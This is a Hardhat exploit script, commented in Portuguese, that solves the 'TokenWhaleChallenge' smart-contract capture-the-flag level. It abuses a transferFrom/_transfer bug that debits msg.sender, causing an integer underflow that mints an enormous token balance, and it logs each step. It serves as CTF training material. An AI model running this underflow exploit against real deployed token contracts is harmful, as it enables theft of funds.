const hre = require("hardhat");

async function main() {
  console.log("ðŸ” Iniciando exploit do TokenWhaleChallenge...\n");

  // O endereÃ§o do contrato pode ser passado como variÃ¡vel de ambiente
  let contractAddress = process.env.CONTRACT_ADDRESS;
  
  if (!contractAddress) {
    console.log("ðŸ“¦ Nenhum endereÃ§o fornecido. Fazendo deploy do contrato...\n");
    
    const [deployer, player] = await hre.ethers.getSigners();
    
    // Deploy do contrato
    const TokenWhaleChallenge = await hre.ethers.getContractFactory("challenges/10_math_token_whale/contracts/TokenWhaleChallenge.sol:TokenWhaleChallenge");
    const challenge = await TokenWhaleChallenge.deploy(player.address);
    await challenge.waitForDeployment();
    contractAddress = await challenge.getAddress();
    
    console.log("âœ… Contrato deployado em:", contractAddress);
    console.log("");
  }

  // Conectar ao contrato
  const TokenWhaleChallenge = await hre.ethers.getContractFactory("challenges/10_math_token_whale/contracts/TokenWhaleChallenge.sol:TokenWhaleChallenge");
  const contract = TokenWhaleChallenge.attach(contractAddress);

  // Obter contas
  const [attacker, player] = await hre.ethers.getSigners();
  
  // Verificar estado antes do exploit
  const totalSupplyBefore = await contract.totalSupply();
  const playerBalanceBefore = await contract.balanceOf(player.address);
  const attackerBalanceBefore = await contract.balanceOf(attacker.address);
  const isCompleteBefore = await contract.isComplete();
  
  console.log("ðŸ“ EndereÃ§o do contrato:", contractAddress);
  console.log("ðŸ‘¤ Player:", player.address);
  console.log("ðŸ‘¤ Atacante:", attacker.address);
  console.log("");
  console.log("ðŸ“Š Estado antes do exploit:");
  console.log("  - Total supply:", totalSupplyBefore.toString());
  console.log("  - Tokens do player:", playerBalanceBefore.toString());
  console.log("  - Tokens do atacante:", attackerBalanceBefore.toString());
  console.log("  - Desafio completo:", isCompleteBefore);
  console.log("");

  if (isCompleteBefore) {
    console.log("âœ… O desafio jÃ¡ estÃ¡ completo!");
    return;
  }

  // VULNERABILIDADE: A funÃ§Ã£o _transfer usa msg.sender em vez de from
  // Quando transferFrom Ã© chamado, _transfer subtrai de msg.sender (nÃ£o de from)
  // Se msg.sender nÃ£o tem tokens, balanceOf[msg.sender] -= value faz underflow
  // Em Solidity 0.4.21, underflow resulta em um nÃºmero muito grande (2^256 - 1)
  
  console.log("ðŸ” Explorando vulnerabilidade em _transfer()...\n");
  console.log("ðŸ’¡ A funÃ§Ã£o _transfer usa msg.sender em vez de from");
  console.log("   Quando transferFrom Ã© chamado, _transfer subtrai de msg.sender (nÃ£o de from)\n");
  
  // EstratÃ©gia:
  // 1. Player aprova o atacante para transferir seus tokens
  // 2. Atacante chama transferFrom(player, player, 1)
  // 3. _transfer faz balanceOf[attacker] -= 1 (mas attacker nÃ£o tem tokens!)
  // 4. Underflow: balanceOf[attacker] = 2^256 - 1 (nÃºmero muito grande)
  // 5. balanceOf[player] += 1 (player ganha 1 token)
  // 6. Repetir atÃ© player ter 1000000 tokens
  
  console.log("ðŸ“ Passo 1: Player aprova o atacante para transferir tokens...");
  const approveTx = await contract.connect(player).approve(attacker.address, hre.ethers.MaxUint256);
  await approveTx.wait();
  console.log("âœ… AprovaÃ§Ã£o confirmada!\n");
  
  console.log("ðŸ“ Passo 2: Atacante chama transferFrom(player, player, 1)...");
  console.log("   Isso farÃ¡ _transfer(player, 1) que usa msg.sender (attacker) em vez de from (player)");
  console.log("   balanceOf[attacker] -= 1 (underflow!) e balanceOf[player] += 1\n");
  
  // Fazer a transferÃªncia que causa o bug
  const transferFromTx = await contract.connect(attacker).transferFrom(player.address, player.address, 1);
  await transferFromTx.wait();
  console.log("âœ… TransferFrom confirmado!\n");
  
  // Verificar saldos apÃ³s o exploit
  const attackerBalanceAfter = await contract.balanceOf(attacker.address);
  const playerBalanceAfter = await contract.balanceOf(player.address);
  
  console.log("ðŸ“Š Saldos apÃ³s transferFrom:");
  console.log("  - Tokens do atacante:", attackerBalanceAfter.toString());
  console.log("  - Tokens do player:", playerBalanceAfter.toString());
  console.log("");
  
  // Agora o atacante tem muitos tokens (devido ao underflow)
  // Podemos transferir tokens do atacante para o player atÃ© ele ter 1000000
  
  console.log("ðŸ“ Passo 3: Transferir tokens do atacante para o player...");
  const tokensNeeded = 1000000n - BigInt(playerBalanceAfter.toString());
  console.log(`   Tokens necessÃ¡rios: ${tokensNeeded.toString()}`);
  
  if (tokensNeeded > 0n) {
    // Transferir tokens do atacante para o player
    // Como o atacante tem muitos tokens (devido ao underflow), podemos transferir
    const transferTx = await contract.connect(attacker).transfer(player.address, tokensNeeded);
    await transferTx.wait();
    console.log("âœ… TransferÃªncia confirmada!\n");
  }
  
  // Verificar estado apÃ³s o exploit
  const playerBalanceFinal = await contract.balanceOf(player.address);
  const isCompleteAfter = await contract.isComplete();
  
  console.log("ðŸ“Š Estado apÃ³s o exploit:");
  console.log("  - Tokens do player:", playerBalanceFinal.toString());
  console.log("  - Desafio completo:", isCompleteAfter);
  
  if (isCompleteAfter) {
    console.log("\nðŸŽ‰ Desafio completado! O player agora tem pelo menos 1,000,000 tokens");
    console.log("\nðŸ’¡ A vulnerabilidade: _transfer usa msg.sender em vez de from.");
    console.log("   Quando transferFrom Ã© chamado, _transfer subtrai de msg.sender (nÃ£o de from).");
    console.log("   Se msg.sender nÃ£o tem tokens, balanceOf[msg.sender] -= value faz underflow,");
    console.log("   resultando em um nÃºmero muito grande (2^256 - 1)!");
  } else {
    console.log("\nâŒ Algo deu errado. O desafio nÃ£o foi completado.");
    console.log("ðŸ’¡ Verifique os logs acima.");
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });

